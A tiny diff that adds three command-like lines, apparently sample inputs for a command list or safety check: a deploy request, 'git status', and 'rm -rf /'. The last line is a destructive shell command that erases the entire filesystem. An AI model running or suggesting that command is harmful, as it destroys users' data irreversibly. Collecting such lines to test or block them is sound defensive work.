@@ -1,0 +1,3 @@
+deploy app to prod
+git status
+rm -rf /
